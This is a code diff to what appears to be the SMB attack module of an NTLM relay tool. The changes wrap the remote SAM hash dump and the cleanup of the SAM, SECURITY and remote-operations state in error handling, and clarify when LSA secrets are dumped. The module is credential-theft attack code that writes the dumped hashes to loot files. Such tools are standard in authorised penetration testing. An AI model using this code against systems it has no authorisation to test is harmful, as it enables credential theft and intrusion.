@@ -36,8 +36,8 @@ PROTOCOL_ATTACK_CLASS = "SMBAttack"
 class SMBAttack(ProtocolAttack):
     """
     This is the SMB default attack class.
-    It will either dump the SAM hashes and LSA secrets from the remote target,
-    or open an interactive shell if the -i option is specified.
+    It will either dump SAM hashes and, when requested, LSA secrets from the
+    remote target, or open an interactive shell if the -i option is specified.
     """
     PLUGIN_NAMES = ["SMB"]
     def __init__(self, config, SMBClient, username, target=None, relay_client=None):
@@ -204,11 +204,14 @@ class SMBAttack(ProtocolAttack):
                         cached_filename = os.path.join(self.config.lootdir, self.__SMBConnection.getRemoteHost() + '_cachedhashes') if self.config.lootdir else self.__SMBConnection.getRemoteHost() + '_cachedhashes'
                         lsa_filename = os.path.join(self.config.lootdir, self.__SMBConnection.getRemoteHost() + '_lsasecrets') if self.config.lootdir else self.__SMBConnection.getRemoteHost() + '_lsasecrets'
 
-                        samFileName = remoteOps.saveSAM()
-                        samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
-                        samHashes.dump()
-                        samHashes.export(sam_filename)
-                        LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                        try:
+                            samFileName = remoteOps.saveSAM()
+                            samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                            samHashes.dump()
+                            samHashes.export(sam_filename)
+                            LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                        except Exception as e:
+                            LOG.error("Failed to dump SAM hashes: %s", str(e))
 
                         if self.config.dumpLSA:
                             try:
@@ -225,9 +228,18 @@ class SMBAttack(ProtocolAttack):
                     LOG.error(str(e))
                 finally:
                     if samHashes is not None:
-                        samHashes.finish()
+                        try:
+                            samHashes.finish()
+                        except Exception as e:
+                            LOG.error("Failed to clean up SAM hive: %s", str(e))
                     if lsaSecrets is not None:
-                        lsaSecrets.finish()
+                        try:
+                            lsaSecrets.finish()
+                        except Exception as e:
+                            LOG.error("Failed to clean up SECURITY hive: %s", str(e))
                     if remoteOps is not None:
-                        remoteOps.finish()
+                        try:
+                            remoteOps.finish()
+                        except Exception as e:
+                            LOG.error("Failed to restore remote operations state: %s", str(e))
                 
